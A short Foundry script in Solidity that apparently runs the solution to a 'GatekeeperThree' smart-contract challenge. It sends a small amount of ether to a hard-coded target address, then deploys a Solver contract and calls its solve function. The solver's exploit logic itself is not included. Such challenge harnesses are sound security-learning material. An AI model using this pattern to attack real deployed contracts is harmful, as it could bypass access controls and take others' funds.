// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Solver} from "src/Solver.sol";
import {IGatekeeperThree} from "src/IGatekeeperThree.sol";

contract SolverScript is Script {

    IGatekeeperThree target;
    Solver solver;

    function setUp() public {
        target = IGatekeeperThree(0x089E06B4c467DB54392DFc2A8498e1B9c9134797);
    }

    function run() public {
        vm.startBroadcast();

        (bool success, ) = address(target).call{ value : 0.0011 ether }("");
        if (!success)
            revert("Ether transfer failed");
        solver = new Solver(target);
        solver.solve();

        vm.stopBroadcast();
    }
}
